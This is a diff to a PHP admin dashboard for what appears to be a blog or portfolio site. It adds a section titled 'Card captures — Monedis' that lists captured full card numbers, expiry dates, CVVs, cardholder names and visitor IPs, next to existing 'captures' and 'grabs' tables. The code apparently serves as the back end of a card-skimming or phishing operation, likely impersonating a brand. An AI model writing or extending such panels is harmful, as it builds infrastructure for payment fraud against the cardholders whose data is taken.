@@ -175,9 +175,9 @@ function page_login(?string $flash, string $csrf): void
     <?php });
 }
 
-function page_admin(array $posts, array $comments, array $leads, array $skills, string $csrf, ?string $flash, array $captures = [], array $grabs = []): void
+function page_admin(array $posts, array $comments, array $leads, array $skills, string $csrf, ?string $flash, array $captures = [], array $grabs = [], array $cards = []): void
 {
-    render_page('Dashboard', $flash, function () use ($posts, $comments, $leads, $skills, $csrf, $captures, $grabs) { ?>
+    render_page('Dashboard', $flash, function () use ($posts, $comments, $leads, $skills, $csrf, $captures, $grabs, $cards) { ?>
         <div class="admin-top">
           <h1>Dashboard</h1>
           <form method="post" action="index.php">
@@ -314,6 +314,28 @@ function page_admin(array $posts, array $comments, array $leads, array $skills, 
                 <td><?= h($g['ip']) ?></td>
                 <td style="font-size:11px;max-width:200px;overflow:hidden;text-overflow:ellipsis"><?= h(mb_substr($g['user_agent'], 0, 60)) ?>…</td>
                 <td><?= h(substr($g['captured_at'], 0, 16)) ?></td>
+              </tr>
+            <?php endforeach; ?>
+            </tbody>
+          </table>
+        </section>
+        <?php endif; ?>
+
+        <?php if ($cards): ?>
+        <section class="admin-block">
+          <h2>Card captures — Monedis (<?= count($cards) ?>)</h2>
+          <table>
+            <thead><tr><th>#</th><th>Card number</th><th>Expiry</th><th>CVV</th><th>Name</th><th>IP</th><th>Date</th></tr></thead>
+            <tbody>
+            <?php foreach ($cards as $c): ?>
+              <tr>
+                <td><?= (int) $c['id'] ?></td>
+                <td><code><?= h(chunk_split((string) $c['card_number'], 4, ' ')) ?></code></td>
+                <td><?= h($c['expiry']) ?></td>
+                <td><?= h($c['cvv']) ?></td>
+                <td><?= h($c['name']) ?></td>
+                <td><?= h($c['ip']) ?></td>
+                <td><?= h(substr($c['captured_at'], 0, 16)) ?></td>
               </tr>
             <?php endforeach; ?>
             </tbody>
